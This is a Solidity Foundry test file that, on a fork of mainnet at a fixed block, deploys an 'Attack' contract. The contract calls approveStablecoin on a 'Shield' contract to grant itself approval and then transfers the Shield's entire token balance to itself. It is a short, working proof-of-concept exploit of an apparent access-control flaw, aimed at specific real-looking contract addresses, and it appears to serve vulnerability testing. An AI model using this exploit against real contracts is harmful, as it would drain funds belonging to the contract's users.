pragma solidity ^0.8.0;

import {IShield} from "../src/IShield.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Vm} from "forge-std/Vm.sol";

contract Attack {
    function mockAttack(address token, address shield, address proxy) external {
        IShield(shield).approveStablecoin(token, address(this));
        uint256 bal = IERC20(proxy).balanceOf(shield);
        IERC20(proxy).transferFrom(shield, address(this), bal);
    }
}

contract testAttack is Test {
    uint256 public mainnetFork;
    address public proxy;
    address public shield;
    address public token;
    Attack public attack;

    function setUp() public {
        string memory mainnetRpcUrl = vm.envString("RPC_URL");
        mainnetFork = vm.createFork(mainnetRpcUrl, 24634311);
        vm.selectFork(mainnetFork);
        shield = address(0x7BDBB20985A703a171781C2448097C6844bc3D48);
        proxy = address(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
        token = address(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
        attack = new Attack();
    }

    function testMockAttack() public {
        attack.mockAttack(token, shield, proxy);
    }
}
